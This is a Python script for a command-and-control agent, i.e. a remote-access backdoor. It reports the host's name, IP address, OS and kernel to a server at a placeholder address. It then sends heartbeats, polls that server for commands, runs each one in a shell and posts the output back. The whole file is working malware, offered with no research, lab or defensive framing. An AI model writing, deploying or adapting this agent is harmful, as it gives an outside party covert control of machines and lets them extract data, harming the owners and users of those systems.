#!/usr/bin/env python3
import requests
import subprocess
import socket
import time
import json
import os
import sys
import threading
import platform
import uuid

# ============================================
# CONFIG
# ============================================

C2_SERVER = "http://YOUR_SERVER_IP:5000"
AGENT_ID = None

# ============================================
# FUNCTIONS
# ============================================

def get_hostname():
    return socket.gethostname()

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def get_os_info():
    return f"{platform.system()} {platform.release()}"

def get_kernel():
    return platform.release()

def register_agent():
    global AGENT_ID
    data = {
        'hostname': get_hostname(),
        'ip': get_ip(),
        'os': get_os_info(),
        'kernel': get_kernel()
    }
    try:
        r = requests.post(f"{C2_SERVER}/api/register", json=data, timeout=5)
        if r.status_code == 200:
            AGENT_ID = r.json().get('id')
            print(f"[+] Registered as ID: {AGENT_ID}")
    except:
        pass

def heartbeat():
    while True:
        try:
            if AGENT_ID:
                requests.post(f"{C2_SERVER}/api/agent/{AGENT_ID}/heartbeat", timeout=5)
        except:
            pass
        time.sleep(30)

def get_tasks():
    while True:
        try:
            if AGENT_ID:
                r = requests.get(f"{C2_SERVER}/api/agent/{AGENT_ID}/tasks", timeout=5)
                if r.status_code == 200:
                    tasks = r.json()
                    for task in tasks:
                        execute_task(task)
        except:
            pass
        time.sleep(5)

def execute_task(task):
    task_id = task['id']
    command = task['command']
    
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
        output = result.decode('utf-8')
    except subprocess.TimeoutExpired:
        output = "[!] Command timeout"
    except Exception as e:
        output = f"[!] Error: {str(e)}"
    
    # Send result back
    try:
        requests.post(f"{C2_SERVER}/api/task/{task_id}/result", 
                     json={'output': output}, timeout=5)
    except:
        pass

# ============================================
# MAIN
# ============================================

def main():
    print("[+] C2 Agent Starting...")
    register_agent()
    
    # Start threads
    threading.Thread(target=heartbeat, daemon=True).start()
    threading.Thread(target=get_tasks, daemon=True).start()
    
    # Keep alive
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
